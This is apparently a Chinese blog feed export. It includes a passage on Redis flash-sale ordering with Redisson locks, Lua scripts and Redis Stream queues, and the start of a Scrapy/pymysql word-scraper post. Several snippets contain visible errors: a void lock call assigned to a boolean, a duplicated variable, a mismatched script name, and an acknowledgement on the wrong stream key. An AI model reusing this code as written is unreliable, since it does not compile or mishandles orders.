        <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">voucher</span> <span class="hljs-operator">=</span> seckillVoucherService.getById(voucherId);
        <span class="hljs-comment">// 2.判断秒杀是否开始</span>
        <span class="hljs-keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;
            <span class="hljs-comment">// 尚未开始</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未开始！&quot;</span>);
        &#125;
        <span class="hljs-comment">// 3.判断秒杀是否已经结束</span>
        <span class="hljs-keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;
            <span class="hljs-comment">// 尚未开始</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀已经结束！&quot;</span>);
        &#125;
        <span class="hljs-comment">// 4.判断库存是否充足</span>
        <span class="hljs-keyword">if</span> (voucher.getStock() &lt; <span class="hljs-number">1</span>) &#123;
            <span class="hljs-comment">// 库存不足</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);
        &#125;
        <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
        <span class="hljs-comment">//创建锁对象 这个代码不用了，因为我们现在要使用分布式锁</span>
        <span class="hljs-comment">//SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, stringRedisTemplate);</span>
        <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redissonClient.getLock(<span class="hljs-string">&quot;lock:order:&quot;</span> + userId);
        <span class="hljs-comment">//获取锁对象</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock();
       
		<span class="hljs-comment">//加锁失败</span>
        <span class="hljs-keyword">if</span> (!isLock) &#123;
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;不允许重复下单&quot;</span>);
        &#125;
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-comment">//获取代理对象(事务)</span>
            <span class="hljs-type">IVoucherOrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IVoucherOrderService) AopContext.currentProxy();
            <span class="hljs-keyword">return</span> proxy.createVoucherOrder(voucherId);
        &#125; <span class="hljs-keyword">finally</span> &#123;
            <span class="hljs-comment">//释放锁</span>
            lock.unlock();
        &#125;
 &#125;</code></pre>

<h2 id="Redisson可重入锁实现原理"><a href="#Redisson可重入锁实现原理" class="headerlink" title="Redisson可重入锁实现原理"></a>Redisson可重入锁实现原理</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106214047985.png" alt="image-20230106214047985"></p>
<p>lua源码分析</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106214447416.png" alt="image-20230106214447416"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106214611516.png" alt="image-20230106214611516"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul>
<li>可重入:利用hash结构记录线程id和重入次数</li>
<li>可重试:利用信号量和PubSub功能实现等待、唤醒，获取锁失败的重试机制</li>
<li>超时续约:利用watchDog，每隔一段时间 (releaseTime&#x2F;3)，重置超时时间</li>
</ul>
<h1 id="Redis优化秒杀"><a href="#Redis优化秒杀" class="headerlink" title="Redis优化秒杀"></a>Redis优化秒杀</h1><h2 id="异步秒杀思路"><a href="#异步秒杀思路" class="headerlink" title="异步秒杀思路"></a>异步秒杀思路</h2><p>优化方案：我们将耗时比较短的逻辑判断放入到redis中，比如是否库存足够，比如是否一人一单，这样的操作，只要这种逻辑可以完成，就意味着我们是一定可以下单完成的，我们只需要进行快速的逻辑判断，根本就不用等下单逻辑走完，我们直接给用户返回成功， 再在后台开一个线程，后台线程慢慢的去执行queue里边的消息，这样程序不就超级快了吗？而且也不用担心线程池消耗殆尽的问题，因为这里我们的程序中并没有手动使用任何线程池，当然这里边有两个难点</p>
<p>第一个难点是我们怎么在redis中去快速校验一人一单，还有库存判断</p>
<p>第二个难点是由于我们校验和tomct下单是两个线程，那么我们如何知道到底哪个单他最后是否成功，或者是下单完成，为了完成这件事我们在redis操作完之后，我们会将一些信息返回给前端，同时也会把这些信息丢到异步queue中去，后续操作中，可以通过这个id来查询我们tomcat中的下单逻辑是否完成了。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106230049190.png" alt="image-20230106230049190"></p>
<p>当用户下单之后，判断库存是否充足只需要导redis中去根据key找对应的value是否大于0即可，如果不充足，则直接结束，如果充足，继续在redis中判断用户是否可以下单，如果set集合中没有这条数据，说明他可以下单，如果set集合中没有这条记录，则将userId和优惠卷存入到redis中，并且返回0，整个过程需要保证是原子性的</p>
<p>当以上判断逻辑走完之后，我们可以判断当前redis中返回的结果是否是0 ，如果是0，则表示可以下单，则将之前说的信息存入到到queue中去，然后返回，然后再来个线程异步的下单，前端可以通过返回的订单id来判断是否下单成功。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106230114639.png" alt="image-20230106230114639"></p>
<h2 id="Redis完成秒杀资格判断"><a href="#Redis完成秒杀资格判断" class="headerlink" title="Redis完成秒杀资格判断"></a>Redis完成秒杀资格判断</h2><p>需求：</p>
<ul>
<li><p>新增秒杀优惠券的同时，将优惠券信息保存到Redis中</p>
</li>
<li><p>基于Lua脚本，判断秒杀库存、一人一单，决定用户是否抢购成功</p>
</li>
<li><p>如果抢购成功，将优惠券id和用户id封装后存入阻塞队列</p>
</li>
<li><p>开启线程任务，不断从阻塞队列中获取信息，实现异步下单功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106230152541.png" alt="image-20230106230152541"></p>
</li>
</ul>
<p>VoucherServiceImpl</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addSeckillVoucher</span><span class="hljs-params">(Voucher voucher)</span> &#123;
    <span class="hljs-comment">// 保存优惠券</span>
    save(voucher);
    <span class="hljs-comment">// 保存秒杀信息</span>
    <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">seckillVoucher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeckillVoucher</span>();
    seckillVoucher.setVoucherId(voucher.getId());
    seckillVoucher.setStock(voucher.getStock());
    seckillVoucher.setBeginTime(voucher.getBeginTime());
    seckillVoucher.setEndTime(voucher.getEndTime());
    seckillVoucherService.save(seckillVoucher);
    <span class="hljs-comment">// 保存秒杀库存到Redis中</span>
    <span class="hljs-comment">//SECKILL_STOCK_KEY 这个变量定义在RedisConstans中</span>
    <span class="hljs-comment">//private static final String SECKILL_STOCK_KEY =&quot;seckill:stock:&quot;</span>
    stringRedisTemplate.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString());
&#125;</code></pre>

<p>完整lua表达式</p>
<p>createOrder.lua</p>
<pre><code class="hljs lua"><span class="hljs-comment">-- 1.参数列表</span>
<span class="hljs-comment">-- 1.1.优惠券id</span>
<span class="hljs-keyword">local</span> voucherId = ARGV[<span class="hljs-number">1</span>]
<span class="hljs-comment">-- 1.2.用户id</span>
<span class="hljs-keyword">local</span> userId = ARGV[<span class="hljs-number">2</span>]
<span class="hljs-comment">-- 1.3.订单id</span>
<span class="hljs-keyword">local</span> orderId = ARGV[<span class="hljs-number">3</span>]

<span class="hljs-comment">-- 2.数据key</span>
<span class="hljs-comment">-- 2.1.库存key</span>
<span class="hljs-keyword">local</span> stockKey = <span class="hljs-string">&#x27;seckill:stock:&#x27;</span> .. voucherId
<span class="hljs-comment">-- 2.2.订单key</span>
<span class="hljs-keyword">local</span> orderKey = <span class="hljs-string">&#x27;seckill:order:&#x27;</span> .. voucherId

<span class="hljs-comment">-- 3.脚本业务</span>
<span class="hljs-comment">-- 3.1.判断库存是否充足 get stockKey 此时获取的是字符串类的数据，需要使用tonumber转化成数字类型与0比较</span>
<span class="hljs-keyword">if</span>(<span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">&#x27;get&#x27;</span>, stockKey)) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span>
    <span class="hljs-comment">-- 3.2.库存不足，返回1</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">end</span>
<span class="hljs-comment">-- 3.2.判断用户是否下单 SISMEMBER orderKey userId  SISMEMBER 判断userId是否存在</span>
<span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;sismember&#x27;</span>, orderKey, userId) == <span class="hljs-number">1</span>) <span class="hljs-keyword">then</span>
    <span class="hljs-comment">-- 3.3.存在，说明是重复下单，返回2</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>
<span class="hljs-keyword">end</span>
<span class="hljs-comment">-- 3.4.扣库存 incrby stockKey -1</span>
redis.call(<span class="hljs-string">&#x27;incrby&#x27;</span>, stockKey, <span class="hljs-number">-1</span>)
<span class="hljs-comment">-- 3.5.下单（保存用户）sadd orderKey userId</span>
redis.call(<span class="hljs-string">&#x27;sadd&#x27;</span>, orderKey, userId)
<span class="hljs-comment">-- 3.6.发送消息到队列中， XADD stream.orders * k1 v1 k2 v2 ...</span>
redis.call(<span class="hljs-string">&#x27;xadd&#x27;</span>, <span class="hljs-string">&#x27;stream.orders&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;userId&#x27;</span>, userId, <span class="hljs-string">&#x27;voucherId&#x27;</span>, voucherId, <span class="hljs-string">&#x27;id&#x27;</span>, orderId)
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span></code></pre>

<p>当以上lua表达式执行完毕后，剩下的就是根据步骤3,4来执行我们接下来的任务了</p>
<p>VoucherOrderServiceImpl</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; SECKILL_STRIPT;

<span class="hljs-comment">// 初始化lua脚本</span>
<span class="hljs-keyword">static</span> &#123;
    SECKILL_STRIPT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();
    SECKILL_STRIPT.setLocation(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">&quot;createOrder.lua&quot;</span>));
    SECKILL_STRIPT.setResultType(Long.class);
&#125;


<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;
    <span class="hljs-comment">//获取用户</span>
    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
    <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);
    <span class="hljs-comment">// 1.执行lua脚本</span>
    <span class="hljs-type">Long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> stringRedisTemplate.execute(
            SECKILL_SCRIPT,
            Collections.emptyList(),
            voucherId.toString(), userId.toString(), String.valueOf(orderId)
    );
    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> result.intValue();
    <span class="hljs-comment">// 2.判断结果是否为0</span>
    <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) &#123;
        <span class="hljs-comment">// 2.1.不为0 ，代表没有购买资格</span>
        <span class="hljs-keyword">return</span> Result.fail(r == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;库存不足&quot;</span> : <span class="hljs-string">&quot;不能重复下单&quot;</span>);
    &#125;
    <span class="hljs-comment">//TODO 保存阻塞队列</span>
    <span class="hljs-comment">// 3.返回订单id</span>
    <span class="hljs-keyword">return</span> Result.ok(orderId);
&#125;</code></pre>

<h2 id="阻塞队列的秒杀优化"><a href="#阻塞队列的秒杀优化" class="headerlink" title="阻塞队列的秒杀优化"></a>阻塞队列的秒杀优化</h2><p>需求：</p>
<ul>
<li>新增秒杀优惠券的同时，将优惠券信息保存到Redis中;</li>
<li>基于Lua脚本，判断秒杀库存、一人一单，决定用户是否抢购成功</li>
<li>如果抢购成功，将优惠券id和用户id封装后存入阻塞队列</li>
<li>开启线程任务，不断从阻塞队列中获取信息，实现异步下单功能</li>
</ul>
<p>VoucherOrderServiceImpl</p>
<p>修改下单动作，现在我们去下单时，是通过lua表达式去原子执行判断逻辑，如果判断我出来不为0 ，则要么是库存不足，要么是重复下单，返回错误信息，如果是0，则把下单的逻辑保存到队列中去，然后异步执行</p>
<pre><code class="hljs java"><span class="hljs-comment">//异步处理线程池</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">SECKILL_ORDER_EXECUTOR</span> <span class="hljs-operator">=</span> Executors.newSingleThreadExecutor();

<span class="hljs-comment">//在类初始化之后执行，因为当这个类初始化好了之后，随时都是有可能要执行的</span>
<span class="hljs-meta">@PostConstruct</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">// 执行VoucherOrderHandler中run方法</span>
   SECKILL_ORDER_EXECUTOR.submit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrderHandler</span>());
&#125;
<span class="hljs-comment">// 用于线程池处理的任务</span>
<span class="hljs-comment">// 当初始化完毕后，就会去从对列中去拿信息</span>
 <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoucherOrderHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;
                <span class="hljs-keyword">try</span> &#123;
                    <span class="hljs-comment">// 1.获取队列中的订单信息</span>
                    <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> orderTasks.take();
                    <span class="hljs-comment">// 2.创建订单</span>
                    <span class="hljs-comment">// 此时handleVoucherOrder函数执行时为VoucherOrderHandler的子线程，不能从ThreadLocal中取出想要的东西，所以代理的对象的获取需要放到主线程(seckillVoucher)中                   </span>
                    handleVoucherOrder(voucherOrder);
                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                    log.error(<span class="hljs-string">&quot;处理订单异常&quot;</span>, e);
                &#125;
          	 &#125;
        &#125;
     
       <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleVoucherOrder</span><span class="hljs-params">(VoucherOrder voucherOrder)</span> &#123;
            <span class="hljs-comment">// 此时handleVoucherOrder函数执行时为VoucherOrderHandler的子线程，不能从ThreadLocal中取出想要的东西</span>
            <span class="hljs-comment">//1.获取用户</span>
            <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> voucherOrder.getUserId();
            <span class="hljs-comment">// 2.创建锁对象</span>
            <span class="hljs-type">RLock</span> <span class="hljs-variable">redisLock</span> <span class="hljs-operator">=</span> redissonClient.getLock(<span class="hljs-string">&quot;lock:order:&quot;</span> + userId);
            <span class="hljs-comment">// 3.尝试获取锁</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> redisLock.lock();
            <span class="hljs-comment">// 4.判断是否获得锁成功</span>
            <span class="hljs-keyword">if</span> (!isLock) &#123;
                <span class="hljs-comment">// 获取锁失败，直接返回失败或者重试</span>
                log.error(<span class="hljs-string">&quot;不允许重复下单！&quot;</span>);
                <span class="hljs-keyword">return</span>;
            &#125;
            <span class="hljs-keyword">try</span> &#123;
				<span class="hljs-comment">//注意：由于是spring的事务是放在threadLocal中，此时的是多线程，事务会失效</span>
                proxy.createVoucherOrder(voucherOrder);
            &#125; <span class="hljs-keyword">finally</span> &#123;
                <span class="hljs-comment">// 释放锁</span>
                redisLock.unlock();
            &#125;
    &#125;
     <span class="hljs-comment">//a</span>
	<span class="hljs-keyword">private</span> BlockingQueue&lt;VoucherOrder&gt; orderTasks =<span class="hljs-keyword">new</span>  <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;
        <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
        <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);
        <span class="hljs-comment">// 1.执行lua脚本</span>
        <span class="hljs-type">Long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> stringRedisTemplate.execute(
                SECKILL_SCRIPT,
                Collections.emptyList(),
                voucherId.toString(), userId.toString(), String.valueOf(orderId)
        );
        <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> result.intValue();
        <span class="hljs-comment">// 2.判断结果是否为0</span>
        <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) &#123;
            <span class="hljs-comment">// 2.1.不为0 ，代表没有购买资格</span>
            <span class="hljs-keyword">return</span> Result.fail(r == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;库存不足&quot;</span> : <span class="hljs-string">&quot;不能重复下单&quot;</span>);
        &#125;
        <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>();
        <span class="hljs-comment">// 2.3.订单id</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);
        voucherOrder.setId(orderId);
        <span class="hljs-comment">// 2.4.用户id</span>
        voucherOrder.setUserId(userId);
        <span class="hljs-comment">// 2.5.代金券id</span>
        voucherOrder.setVoucherId(voucherId);
        <span class="hljs-comment">// 2.6.放入阻塞队列</span>
        orderTasks.add(voucherOrder);
        <span class="hljs-comment">//3.获取代理对象</span>
         proxy = (IVoucherOrderService)AopContext.currentProxy();
        <span class="hljs-comment">//4.返回订单id</span>
        <span class="hljs-keyword">return</span> Result.ok(orderId);
    &#125;
     
      <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">createVoucherOrder</span><span class="hljs-params">(VoucherOrder voucherOrder)</span> &#123;
        <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> voucherOrder.getUserId();
        <span class="hljs-comment">// 5.1.查询订单</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherOrder.getVoucherId()).count();
        <span class="hljs-comment">// 5.2.判断是否存在</span>
        <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;
            <span class="hljs-comment">// 用户已经购买过了</span>
           log.error(<span class="hljs-string">&quot;用户已经购买过了&quot;</span>);
           <span class="hljs-keyword">return</span> ;
        &#125;

        <span class="hljs-comment">// 6.扣减库存</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> seckillVoucherService.update()
                .setSql(<span class="hljs-string">&quot;stock = stock - 1&quot;</span>) <span class="hljs-comment">// set stock = stock - 1</span>
                .eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherOrder.getVoucherId()).gt(<span class="hljs-string">&quot;stock&quot;</span>, <span class="hljs-number">0</span>) <span class="hljs-comment">// where id = ? and stock &gt; 0</span>
                .update();
        <span class="hljs-keyword">if</span> (!success) &#123;
            <span class="hljs-comment">// 扣减失败</span>
            log.error(<span class="hljs-string">&quot;库存不足&quot;</span>);
            <span class="hljs-keyword">return</span> ;
        &#125;
        save(voucherOrder);
 
    &#125;</code></pre>



<h1 id="Redis消息队列实现异步秒杀"><a href="#Redis消息队列实现异步秒杀" class="headerlink" title="Redis消息队列实现异步秒杀"></a>Redis消息队列实现异步秒杀</h1><p>Redis消息队列-基于Stream的消息队列-消费者组</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230107225137409.png" alt="image-20230107225137409"></p>
<h3 id="基于Redis的Stream结构作为消息队列，实现异步秒杀下单"><a href="#基于Redis的Stream结构作为消息队列，实现异步秒杀下单" class="headerlink" title="基于Redis的Stream结构作为消息队列，实现异步秒杀下单"></a>基于Redis的Stream结构作为消息队列，实现异步秒杀下单</h3><p>需求：</p>
<ul>
<li>创建一个Stream类型的消息队列，名为stream.orders</li>
<li>修改之前的秒杀下单Lua脚本，在认定有抢购资格后，直接向stream.orders中添加消息，内容包含voucherId、userId、orderId</li>
<li>项目启动时，开启一个线程任务，尝试获取stream.orders中的消息，完成下单\</li>
</ul>
<p>修改lua表达式,新增3.6 </p>
<pre><code class="hljs lua"><span class="hljs-comment">---- 3.6.发送消息到队列中， XADD stream.orders * k1 v1 k2 v2 ...</span>
redis.call(<span class="hljs-string">&#x27;xadd&#x27;</span>, <span class="hljs-string">&#x27;stream.orders&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;userId&#x27;</span>, userId, <span class="hljs-string">&#x27;voucherId&#x27;</span>, voucherId, <span class="hljs-string">&#x27;id&#x27;</span>, orderId)</code></pre>

<p>VoucherOrderServiceImpl</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoucherOrderHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 1.获取消息队列中的订单信息 XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 &gt;</span>
                List&lt;MapRecord&lt;String, Object, Object&gt;&gt; list = stringRedisTemplate.opsForStream().read(
                    Consumer.from(<span class="hljs-string">&quot;g1&quot;</span>, <span class="hljs-string">&quot;c1&quot;</span>),
                    StreamReadOptions.empty().count(<span class="hljs-number">1</span>).block(Duration.ofSeconds(<span class="hljs-number">2</span>)),
                    StreamOffset.create(<span class="hljs-string">&quot;stream.orders&quot;</span>, ReadOffset.lastConsumed())
                );
                <span class="hljs-comment">// 2.判断订单信息是否为空</span>
                <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span> || list.isEmpty()) &#123;
                    <span class="hljs-comment">// 如果为null，说明没有消息，继续下一次循环</span>
                    <span class="hljs-keyword">continue</span>;
                &#125;
                <span class="hljs-comment">// 解析数据</span>
                MapRecord&lt;String, Object, Object&gt; record = list.get(<span class="hljs-number">0</span>);
                Map&lt;Object, Object&gt; value = record.getValue();
                <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> BeanUtil.fillBeanWithMap(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>(), <span class="hljs-literal">true</span>);
                <span class="hljs-comment">// 3.创建订单</span>
                createVoucherOrder(voucherOrder);
                <span class="hljs-comment">// 4.确认消息 XACK</span>
                stringRedisTemplate.opsForStream().acknowledge(<span class="hljs-string">&quot;s1&quot;</span>, <span class="hljs-string">&quot;g1&quot;</span>, record.getId());
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                log.error(<span class="hljs-string">&quot;处理订单异常&quot;</span>, e);
                <span class="hljs-comment">//处理异常消息</span>
                handlePendingList();
            &#125;
        &#125;
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlePendingList</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 1.获取pending-list中的订单信息 XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 0</span>
                List&lt;MapRecord&lt;String, Object, Object&gt;&gt; list = stringRedisTemplate.opsForStream().read(
                    Consumer.from(<span class="hljs-string">&quot;g1&quot;</span>, <span class="hljs-string">&quot;c1&quot;</span>),
                    StreamReadOptions.empty().count(<span class="hljs-number">1</span>),
                    StreamOffset.create(<span class="hljs-string">&quot;stream.orders&quot;</span>, ReadOffset.from(<span class="hljs-string">&quot;0&quot;</span>))
                );
                <span class="hljs-comment">// 2.判断订单信息是否为空</span>
                <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span> || list.isEmpty()) &#123;
                    <span class="hljs-comment">// 如果为null，说明没有异常消息，结束循环</span>
                    <span class="hljs-keyword">break</span>;
                &#125;
                <span class="hljs-comment">// 解析数据</span>
                MapRecord&lt;String, Object, Object&gt; record = list.get(<span class="hljs-number">0</span>);
                Map&lt;Object, Object&gt; value = record.getValue();
                <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> BeanUtil.fillBeanWithMap(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>(), <span class="hljs-literal">true</span>);
                <span class="hljs-comment">// 3.创建订单</span>
                createVoucherOrder(voucherOrder);
                <span class="hljs-comment">// 4.确认消息 XACK</span>
                stringRedisTemplate.opsForStream().acknowledge(<span class="hljs-string">&quot;s1&quot;</span>, <span class="hljs-string">&quot;g1&quot;</span>, record.getId());
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                log.error(<span class="hljs-string">&quot;处理pendding订单异常&quot;</span>, e);
                <span class="hljs-keyword">try</span>&#123;
                    Thread.sleep(<span class="hljs-number">20</span>);
                &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;
                    e.printStackTrace();
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>spiderofwords</title>
    <url>/2021/05/02/spiderofwords/</url>
    <content><![CDATA[<p>scripy爬虫爬取单词(word.iciba.com)</p>
<h1 id="scripy爬虫爬取单词X"><a href="#scripy爬虫爬取单词X" class="headerlink" title="scripy爬虫爬取单词X"></a>scripy爬虫爬取单词X</h1><h1 id="首先创建一个有关数据库操作的py"><a href="#首先创建一个有关数据库操作的py" class="headerlink" title="首先创建一个有关数据库操作的py"></a>首先创建一个有关数据库操作的py</h1><p><code>dbhelper.py</code></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">from</span> scrapy.utils.project <span class="hljs-keyword">import</span> get_project_settings

// MYSQL_HOST等参数定义在setting.py中
// 也可以直接定义在这个文件中
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DBHelper</span>():

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.settings = get_project_settings()
        self.host = self.settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>]
        self.port = self.settings[<span class="hljs-string">&#x27;MYSQL_PORT&#x27;</span>]
        self.user = self.settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>]
        self.passwd = self.settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>]
        self.db = self.settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>]

    // 建立数据库连接
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connectMysql</span>(<span class="hljs-params">self</span>):
        conn = pymysql.connect(host=self.host,
                               port=self.port,
                               user=self.user,
                               passwd=self.passwd,
                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)
        <span class="hljs-keyword">return</span> conn

	// 创建数据库
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connectDatabase</span>(<span class="hljs-params">self</span>):
        conn = pymysql.connect(host=self.host,
                               port=self.port,
                               user=self.user,
                               passwd=self.passwd,
                               db=self.db,
                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)
        <span class="hljs-keyword">return</span> conn

        <span class="hljs-comment"># 创建要使用到的数据库</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">createDatabase</span>(<span class="hljs-params">self</span>):
        conn = self.connectMysql()
        sql = <span class="hljs-string">&quot;create database if not exists &quot;</span> + self.db
        cur = conn.cursor()
        cur.execute(sql)  <span class="hljs-comment">#</span>
        cur.close()
        conn.close()

        <span class="hljs-comment"># 创建数据表</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">createTable</span>(<span class="hljs-params">self, sql</span>):
        conn = self.connectDatabase()

        cur = conn.cursor()
        cur.execute(sql)
        cur.close()
        conn.close()

